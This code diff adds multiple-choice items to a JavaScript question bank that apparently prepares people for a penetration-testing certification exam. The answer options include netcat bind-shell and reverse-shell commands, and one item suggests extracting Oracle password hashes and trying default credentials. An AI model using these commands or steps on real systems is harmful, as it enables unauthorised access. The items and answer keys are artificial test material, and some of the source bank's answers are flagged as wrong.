@@ -301,4 +301,40 @@ const QUESTIONS = [
 {src:"Tips",t:"Tools & Output",q:"Which netcat command sets up a bind shell listener on Windows?",o:["nc -nlvp 4444 -e cmd.exe","nc -nv 10.0.0.1 4444","nc -nlvp 4444","nc -e /bin/bash 10.0.0.1 4444"],a:0,n:"-e binds a program to the connection; -nlvp = listen."},
 {src:"Tips",t:"Tools & Output",q:"ICMP type 3 is?",o:["Destination Unreachable","Echo Reply","Redirect","Time Exceeded"],a:0,n:"3=Unreachable, 5=Redirect, 11=Time Exceeded."},
 {src:"Tips",t:"Tools & Output",q:"ICMP type 11 is?",o:["Time Exceeded (e.g. TTL=0 in traceroute)","Echo Request","Timestamp","Parameter Problem"],a:0,n:"Traceroute relies on Time Exceeded replies."},
+// ================= Third batch: coverage gaps from source PDFs =================
+
+// ---- Bank: ports/services not yet converted ----
+{src:"Bank",t:"Ports & Services",q:"Port 445 is used by which service?",o:["SMB directly over TCP","NetBIOS Session","Sun RPC","LDAP"],a:0,n:"445 = SMB over TCP without NetBIOS; 139 is SMB over NetBIOS."},
+{src:"Bank",t:"Ports & Services",q:"Port 1433 is the default for?",o:["Microsoft SQL Server","MySQL","Oracle","IBM DB2"],a:0,n:"1433 = MSSQL engine; 1434 = SQL Browser."},
+{src:"Bank",t:"Ports & Services",q:"Ports 6100/6200 relate to which service?",o:["Oracle Notification Service (local/remote)","X11 displays","VNC","JetDirect"],a:0,n:"Oracle DB local (6100) and remote (6200) notification service."},
+{src:"Bank",t:"Ports & Services",q:"Which number is associated with SCTP?",o:["132 (IP protocol number)","139","500","520"],a:0,n:"SCTP = IP protocol 132; exam options may also list ports 2905/3868 (M3UA/Diameter)."},
+{src:"Bank",t:"Ports & Services",q:"NetBIOS Datagram Service uses which port?",o:["138","137","139","445"],a:0,n:"137 Name, 138 Datagram, 139 Session."},
+
+// ---- Bank: acronyms ----
+{src:"Bank",t:"Acronyms",q:"ASP stands for?",o:["Active Server Pages","Application Service Provider","Advanced Scripting Platform","Authenticated Session Protocol"],a:0,n:"Microsoft server-side scripting."},
+{src:"Bank",t:"Acronyms",q:"AJAX stands for?",o:["Asynchronous JavaScript and XML","Advanced Java And XML","Automated JSON And XML","Active Java Applet eXtension"],a:0,n:"Technique for async web requests."},
+{src:"Bank",t:"Acronyms",q:"CVE stands for?",o:["Common Vulnerabilities and Exposures","Critical Vulnerability Enumeration","Common Verified Exploits","Central Vulnerability Engine"],a:0,n:"The public vulnerability identifier scheme."},
+{src:"Bank",t:"Acronyms",q:"SSID stands for?",o:["Service Set Identifier","Secure Session ID","Signal Strength Indicator","System Service ID"],a:0,n:"The wireless network name."},
+{src:"Bank",t:"Acronyms",q:"J2EE stands for?",o:["Java 2 Platform, Enterprise Edition","Java 2 Embedded Environment","JavaScript Enterprise Engine","Java 2 Extended Edition"],a:0,n:"Enterprise Java platform (now Jakarta EE)."},
+{src:"Bank",t:"Acronyms",q:"APIPA stands for?",o:["Automatic Private IP Addressing","Assigned Private Internet Protocol Address","Automatic Public IP Allocation","Address Pool IP Assignment"],a:0,n:"169.254.0.0/16 self-assigned when DHCP fails."},
+
+// ---- Bank: tool output / enumeration ----
+{src:"Bank",t:"Enumeration",q:"Can an SSH client speaking only protocol v1 connect to a v2-only server?",o:["No — SSHv1 and SSHv2 are not interoperable","Yes, they auto-negotiate","Only with a shared key","Yes, tunnelled over TLS"],a:0,n:"A '1.99' banner means the server offers BOTH v1 and v2."},
+{src:"Bank",t:"Tools & Output",q:"A host is identified as a Master Browser. Which command (per the bank) is used to restart/demote it?",o:["dcpromo","nbtstat","whoami","ping"],a:0,n:"Bank's stated answer; dcpromo actually promotes/demotes domain controllers."},
+
+// ---- Bank: databases ----
+{src:"Bank",t:"Databases",q:"Where does Oracle store account password hashes (e.g. DBSNMP)?",o:["SYS.USER$ (sys.users)","pg_shadow","mysql.user","master..syslogins"],a:0,n:"Oracle hashes live in SYS.USER$."},
+{src:"Bank",t:"Databases",q:"In a hash stored as 0x0100<8-char salt><hash>, which part is the salt?",o:["The 8 characters after 0x0100","The 0x0100 header","The trailing hash block","The entire string"],a:0,n:"MSSQL format: header, then salt, then hash."},
+{src:"Bank",t:"Databases",q:"You have Oracle access as DBSNMP but cannot create users. Best next step?",o:["Extract password hashes and try default creds on other accounts","Give up — nothing else is possible","Drop all tables","Reboot the server"],a:0,n:"DBSNMP can read passwords; pivot using defaults."},
+
+// ---- Bank: wireless (802.11n corrected) ----
+{src:"Bank",t:"Wireless",q:"802.11n operates on which band(s)?",o:["2.4 GHz and 5 GHz","5 GHz only","2.4 GHz only","900 MHz"],a:0,n:"802.11n is dual-band.",j:"MY CORRECTION: the Bank listed 802.11n as 5 GHz only; it actually operates on both 2.4 and 5 GHz."},
+
+// ---- Tips: sections not yet represented ----
+{src:"Tips",t:"Vulns & Attacks",q:"Which is a documented VLAN attack?",o:["Switch spoofing / VLAN hopping","Slowloris","Kerberoasting","DNS cache poisoning"],a:0,n:"VLAN risks: CAM overflow, ARP, switch-spoofing/hopping, CDP, PVLAN, STP attacks."},
+{src:"Tips",t:"Enumeration",q:"Which command accesses a Windows SMB share from a Unix host?",o:["smbclient","showmount","rpcinfo","net share"],a:0,n:"smbclient //ip/share; 'net share' is the Windows-side command."},
+{src:"Tips",t:"Other Tech",q:"What is an ISAPI filter?",o:["An in-process IIS DLL that can handle every HTTP request","A CGI executable","A firewall ruleset","An SMTP relay agent"],a:0,n:"Runs in-process (faster than per-request CGI); used for encryption, logging, screening."},
+{src:"Tips",t:"Protocols & Layers",q:"Which IP Option number is 'loose source routing'?",o:["3","1","7","9"],a:0,n:"1=no-op, 2=security, 3=loose source route, 7=record route, 9=strict source route."},
+{src:"Tips",t:"Windows/Linux",q:"Which command lists available AD domains?",o:["net view /domain","net group /domain","nbtstat -A","ipconfig /displaydns"],a:0,n:"net view /domain; /displaydns shows the local DNS cache."},
+{src:"Tips",t:"Cryptography",q:"How many hex characters is a SHA-512 hash?",o:["128","64","40","256"],a:0,n:"SHA-512 = 64 bytes = 128 hex chars."},
 ];
